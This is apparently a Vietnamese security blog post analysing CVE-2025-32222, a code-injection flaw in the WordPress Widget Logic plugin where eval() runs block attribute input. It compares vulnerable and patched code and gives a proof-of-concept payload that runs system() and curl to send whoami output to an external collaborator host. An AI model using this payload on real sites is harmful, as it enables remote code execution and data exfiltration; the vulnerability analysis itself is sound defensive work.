# CVE-2025-32222 Analysis & POC


<!--more-->

## CVE & Basic Info
Lỗ hổng **Improper Control of Generation of Code ('Code Injection')** trong Widgetlogic.org **Widget Logic (widget-logic)** cho phép **Code Injection**. Vấn đề này ảnh hưởng tới Widget Logic từ phiên bản **n/a đến <= 6.0.5**.

* **CVE ID**: [CVE-2025-32222](https://www.cve.org/CVERecord?id=CVE-2025-32222)
* **Vulnerability Type**: Remote Code Execution
* **Affected Versions**: <= 6.0.5
* **Patched Versions**: 6.0.6
* **CVSS severity**: High (9.9)
* **Required Privilege**: Contributor
* **Product**: [WordPress Widget Logic Plugin](https://wordpress.org/plugins/widget-logic/)

## Requirements
* **Local WordPress & Debugging**
    * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
    * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Widget Logic**:  
    * `6.0.5` – **vulnerable**  
    * `6.0.6` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) hoặc bất kỳ công cụ diff nào.

## Cause
**Trong phiên bản lỗi (v6.0.5):**

```php {title="logic.php v6.0.5" data-open=true hl_lines=[15,21]}
function widget_logic_check_logic($logic)
{
    $logic = @trim((string) $logic);
    $logic = apply_filters("widget_logic_eval_override", $logic);

    if (is_bool($logic)) {
        return $logic;
    }

    if ($logic === '') {
        return true;
    }

    if (stristr($logic, 'return') === false) {
        $logic = 'return (' . html_entity_decode($logic, ENT_COMPAT | ENT_HTML401 | ENT_QUOTES) . ');';
    }

    set_error_handler('widget_logic_error_handler'); // phpcs:ignore -- we have mode for debugging for admins

    try {
        $show_widget = eval ($logic); // @codingStandardsIgnoreLine - widget can't work without eval
    } catch (Error $e) {
        trigger_error($e->getMessage(), E_USER_WARNING); // @codingStandardsIgnoreLine - message is not dependent on user input

        $show_widget = false;
    }

    restore_error_handler();

    return $show_widget;
}
```

Hàm `widget_logic_check_logic()` sử dụng `eval()` để thực thi trực tiếp chuỗi logic do người dùng cung cấp, không giới hạn hàm nào được gọi. Nếu chuỗi logic không chứa từ khóa `return`, hàm sẽ tự động bọc nó thành một câu lệnh `return(...)` để đảm bảo biểu thức luôn hợp lệ khi `eval()` thực thi. Cơ chế này giúp người dùng chỉ cần nhập biểu thức điều kiện đơn giản, nhưng đồng thời cũng biến mọi input của người dùng thành mã PHP hoàn chỉnh, làm tăng nguy cơ **thực thi mã tùy ý (RCE)**.

**Bản vá (v6.0.6):** 

```php {title="class-wpsight-api.php v6.0.6" data-open=true hl_lines=[4,5,6]}
function widget_logic_check_logic($logic)
{
    $allowed_functions = array(
        'is_home', 'is_front_page', 'is_single', 'is_page', 'is_category',
        'is_tag', 'is_archive', 'is_search', 'is_404', 'is_user_logged_in',
        'current_user_can', 'is_active_sidebar', 'is_admin',
    );

    $allowed_functions = apply_filters('widget_logic_allowed_functions', $allowed_functions);

    $logic = trim((string) $logic);
    if ('' === $logic) {
        return true;
    }

    // Set up error handling
    set_error_handler('widget_logic_error_handler', E_WARNING | E_USER_WARNING);  // @codingStandardsIgnoreLine - we need this for error handling

    try {
        // Tokenize the logic string
        $tokens = widget_logic_tokenize($logic);

        // Parse and evaluate the expression
        $pos = 0;
        $result = widget_logic_parse_expression($tokens, $pos, $allowed_functions);

        // Check if there are any unexpected tokens after the expression
        if ($pos < count($tokens)) {
            throw new Exception(esc_html__('Widget Logic: Unexpected tokens after expression.', 'widget-logic'));
        }

        return (bool)$result;
    } catch (Exception $e) {
        widget_logic_error_handler(E_USER_WARNING, $e->getMessage());
        return false;
    } finally {
        restore_error_handler();
    }
}
```

![Diff](diff.png "Sự thay đổi của bản vá")

Bản vá đã loại bỏ `eval()`, thay bằng **tokenizer và parser** để đánh giá logic, chỉ cho phép các hàm trong danh sách **whitelist**. Nó kiểm tra cú pháp, phát hiện token dư, xử lý lỗi bằng `try/catch/finally`, từ đó **tăng cường bảo mật** và đảm bảo logic widget vẫn hoạt động bình thường.

## Analysis
Plugin đã đăng ký một filter hook:

```php {title="index.php v6.0.5" data-open=true hl_lines=[]}
add_filter('render_block', 'widget_logic_block_render', 10, 2);
```

`render_block`: hook filter của WordPress, được gọi mỗi khi một block (Gutenberg block) được render. Tức khi post/page được tạo, plugin sẽ can thiệp vào quá trình render block với callback `widget_logic_block_render`

```php {title="index.php v6.0.5" data-open=true hl_lines=[]}
function widget_logic_block_render($block_content, $block)
{
    if (!isset($block['attrs']['widgetLogic'])) {
        return $block_content;
    }

    return widget_logic_check_logic($block['attrs']['widgetLogic']) ? $block_content : '';
}
```

Hàm `widget_logic_block_render` sẽ kiểm tra nếu block không có attribute `widgetLogic`, nó sẽ hiển thị bình thường. Attribute này được thêm vào thông qua **Advanced Option** khi thêm block.

![Widget](widget.png "Widget Logic trong Advanced Option")

`widget_logic_check_logic` được gọi Nếu block có attribute này.

Lỗ hổng được công bố với yêu cầu đặc quyền **Contributor** vì đây là đặc quyền có thể tạo post và sử dụng Widget Logic trong Advanced Option.

## Flow

{{< mermaid >}}
graph TD

A["Contributor creates/edits a Gutenberg block"] --> B["Add widgetLogic value in Advanced Options"]

B --> C["Page/Post is rendered"]
C --> D["render_block filter is triggered"]

D --> E["widget_logic_block_render() is called"]

E --> F{"block['attrs']['widgetLogic'] exists?"}
F -- No --> G["Render block normally"]
F -- Yes --> H["Pass widgetLogic to widget_logic_check_logic()"]

H --> I["Normalize & wrap logic with return(...) if needed"]
I --> J["Execute logic using eval()"]

J --> K{"Result = true ?"}
K -- Yes --> L["Block content is displayed"]
K -- No --> M["Block is hidden (empty)"]

J --> N{"Malicious code injected?"}
N -- Yes --> O["Arbitrary PHP code executed (RCE)"]

L --> Z["End"]
M --> Z
O --> Z
{{< /mermaid >}}

## Proof of Concept (PoC)
1. Đăng nhập với user **Contributor**
2. Tạo post, thêm một block bất kì và thêm payload vào **Widget Logic**:

```http
system('curl http://929topgvyzo9d93rxe1xpxcriio9cz0o.oastify.com/?leadked=$(whoami)')
```

![Result](result.png "Kết quả")

## Conclusion

CVE‑2025‑32222 bắt nguồn từ việc **sử dụng `eval()` trên dữ liệu do người dùng kiểm soát** trong `widget_logic_check_logic()`. Chỉ với quyền **Contributor**, kẻ tấn công có thể chèn logic độc hại vào thuộc tính `widgetLogic` của block, khiến mã PHP tùy ý được thực thi trong quá trình `render_block`. Cơ chế tự động bọc `return(...)` càng làm việc khai thác dễ dàng hơn vì mọi chuỗi nhập vào cuối cùng đều trở thành mã PHP hợp lệ. Bản vá 6.0.6 đã xử lý triệt để bằng cách loại bỏ `eval()`, dùng cơ chế **tokenize + parse + allowlist**, từ đó chặn hoàn toàn khả năng thực thi mã tùy ý.

## Key Takeaways

* Không bao giờ sử dụng `eval()` với dữ liệu đến từ người dùng, kể cả người dùng có đặc quyền thấp hơn admin.
* Các biểu thức logic nên được xử lý bằng **parser riêng + whitelist hàm hợp lệ**, không phải thực thi trực tiếp.
* Dữ liệu gắn vào block (block attributes) vẫn là **user input** và phải được kiểm soát chặt chẽ.
* Chỉ cần quyền **Contributor** cũng có thể gây ra **RCE nghiêm trọng** nếu cơ chế kiểm soát đầu vào sai.
* Việc thay thế `eval()` bằng cách tiếp cận phân tích cú pháp an toàn là hướng đi đúng cho các plugin xử lý “logic người dùng”.

## References

[Remote Code Execution (RCE)](https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/)

[WordPress Widget Logic Plugin <= 6.0.5 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/widget-logic/vulnerability/wordpress-widget-logic-6-0-5-remote-code-execution-rce-vulnerability)

---

> Tác giả: [Bui Van Y](github.com/w41bu1)  
> URL: http://localhost:1313/vi/posts/2025-11-30-cve-2025-32222/  

